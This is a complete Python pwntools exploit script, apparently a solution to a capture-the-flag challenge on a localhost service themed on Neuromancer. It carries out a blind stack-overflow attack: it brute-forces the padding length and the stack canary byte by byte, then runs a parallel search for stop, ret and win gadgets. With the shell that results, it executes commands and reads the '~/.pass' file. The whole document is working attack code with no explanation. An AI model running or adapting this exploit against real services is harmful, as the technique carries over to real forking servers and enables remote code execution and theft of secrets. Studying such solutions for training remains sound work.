from pwn import *
from enum import Enum, auto
import multiprocessing
import sys

# Suppress pwntools connection logs for a clean output
context.log_level = 'error'

taddr = "localhost"
tport = 4243
PROMPT = b"[BOBBY] You don't know what you've gotten into: "
TIMEOUT = 2
C = b'X'

class CheckStatus(Enum):
    EXPECTED_RESPONSE = auto()
    TIMEOUT = auto()
    CONNECTION_CLOSED = auto()
    UNEXPECTED_RESPONSE = auto()
    CONNECTION_ERROR = auto()
    PROTOCOL_ERROR = auto()
    SHELLEXECUTOR = auto()

def create_connection():
    """Helper to initialize a remote connection and sync with the prompt."""
    p = remote(taddr, tport, timeout=TIMEOUT)
    p.recvuntil(PROMPT, timeout=TIMEOUT)
    return p

def check_b_crash(payload, b, debug=False):
    p = None
    try:
        p = create_connection()
        p.send(payload + bytes([b]))
        
        expected = [b"[BOBBY] Input received.", b"[MATRIX] Bobby Newmark \xe2\x80\x94 unauthorized access detected."]
        for _ in range(2):
            res = p.recv(timeout=TIMEOUT)
            if not any(exp in res for exp in expected):
                return False
                
        p.sendline(b"PING")
        return p.connected("recv")
    except (EOFError, PwnlibException, OSError):
        return False
    finally:
        if p: p.close()

def check_crash(payload, debug=False):
    p = None
    try:
        p = create_connection()
        p.send(payload)
        response = p.recvline(timeout=TIMEOUT)
        
        if not p.connected("recv"):
            return CheckStatus.CONNECTION_CLOSED

        for _ in range(4):
            p.send(b"echo PWNED\n")
            res = p.recv(timeout=TIMEOUT)
            if b"PWNED" in res:
                return CheckStatus.SHELLEXECUTOR
            if not p.connected("recv"):
                return CheckStatus.CONNECTION_CLOSED
                
        return CheckStatus.TIMEOUT
    except (EOFError, PwnlibException, OSError) as exc:
        if debug: print("[DEBUG] Connection error:", repr(exc))
        return CheckStatus.CONNECTION_ERROR
    finally:
        if p: p.close()

def check_valid(payload, debug="<X-X>"):
    status = check_crash(payload, True)
    if status in [CheckStatus.CONNECTION_ERROR, CheckStatus.CONNECTION_CLOSED]:
        print(f"[-] Invalid payload [{debug}]: Connection lost 😿", file=sys.stderr)
        exit(1)

def getFlag(payload):
    p = None
    try:
        p = create_connection()
        p.send(payload)
        p.recv(timeout=TIMEOUT)  # Ignore standard responses
        p.send(b"cat ~/.pass\n")
        res = p.recv(timeout=TIMEOUT)
        print("Flag{" + res.decode("utf-8", errors="ignore").strip() + "}")
        return True
    except (EOFError, PwnlibException):
        return False
    finally:
        if p: p.close()

def bruteforce_nbyte(payload, n, debug=False):
    bts = b''
    for i in range(n):
        found = False
        for b in range(256):
            tmp = payload + bts
            print(f"[*] Bruteforcing byte {i+1}/{n} : {hex(b)} ...", end='')
            if check_b_crash(tmp, b, debug):
                bts += bytes([b])
                print("\r", end='')
                print(f"[+] 🪨 byte[{i+1}] = {hex(b)}                ")
                found = True
                break
            print("\r", end='')
        if not found:
            print(f"[x] Byte {i+1} failed to bruteforce!", file=sys.stderr)
            exit(1)
    return bts


# --- TOP-LEVEL HELPER FUNCTIONS (Picklable for Multiprocessing) ---
def pack_16bit(b):
    return p16(b) + b'\x40\x00\x00\x00\x00\x00'

def is_timeout(status):
    return status == CheckStatus.TIMEOUT

def is_not_closed(status):
    return status not in [CheckStatus.CONNECTION_ERROR, CheckStatus.CONNECTION_CLOSED]

def is_shellexecutor(status):
    return status == CheckStatus.SHELLEXECUTOR


# --- GENERALIZED MULTIPROCESSING SEARCH ENGINE ---
def _worker_gadget_task(args):
    prefix, suffix, pack_func_name, start, end, step, condition_name = args
    
    # Map function names back to actual callables inside the worker process
    pack_func = globals()[pack_func_name]
    success_condition = globals()[condition_name]

    for b in range(start, end, step):
        gadget = pack_func(b)
        tmp = prefix + gadget + suffix
        status = check_crash(tmp)
        if success_condition(status):
            print(f"[+] Found matching gadget: {gadget.hex()} (status: {status})", file=sys.stderr)
            return gadget
    return None

def brute_gadget(prefix, suffix, pack_func_name, start, end, condition_name, step=1, workers=4):
    chunk_size = (end - start) // workers
    tasks = []
    for i in range(workers):
        w_start = start + (i * chunk_size)
        w_end = w_start + chunk_size if i < (workers - 1) else end
        tasks.append((prefix, suffix, pack_func_name, w_start, w_end, step, condition_name))

    with multiprocessing.Pool(processes=workers) as pool:
        for result in pool.imap_unordered(_worker_gadget_task, tasks):
            if result is not None:
                pool.terminate()
                return result
    return b''

# 1. Find Padding
padding = 1
print("[>] Finding padding size...")
while True:
    if check_b_crash(C * padding, 42):
        padding += 1
    else:
        print(f"[+] Padding found: {padding}")
        break

# 2. Brute-force Canary
canary = b'\x00' + bruteforce_nbyte(C * padding + b'\x00', 7)
print(f"[+] Canary: {canary}")
check_valid(C * padding + canary, debug="canary")

building = C * padding + canary + (b'\x00' * 8)  # rbp placeholder

# 3. Find STOP Gadget (Using Multiprocessing)
print("[>] Searching for STOP gadget...")
STOP_GADGET = brute_gadget(
    prefix=building,
    suffix=b'',
    pack_func_name="pack_16bit",
    start=0x610,
    end=0xffff,
    condition_name="is_timeout"
)
print(f"[+] STOP gadget: {STOP_GADGET.hex()}")

# 4. Find Return Gadget (Using Multiprocessing)
print("[>] Searching for RET gadget...")
ret = brute_gadget(
    prefix=building,
    suffix=STOP_GADGET,
    pack_func_name="pack_16bit",
    start=0x610,
    end=0xffff,
    condition_name="is_not_closed"
)
print(f"[+] RET gadget: {ret.hex()}")

building_rbp_ret = building + ret

# 5. Find WIN Function (Using Multiprocessing)
print("[>] Searching for WIN function...")
WIN = brute_gadget(
    prefix=building_rbp_ret,
    suffix=STOP_GADGET,
    pack_func_name="p64",
    start=0x401000,
    end=0x401400,
    condition_name="is_shellexecutor"
)

if len(WIN) == 8:
    print(f"[+] WIN address acquired: {WIN.hex()}")
    getFlag(building_rbp_ret + WIN + STOP_GADGET)
else:
    print("[-] Unable to get a shell!")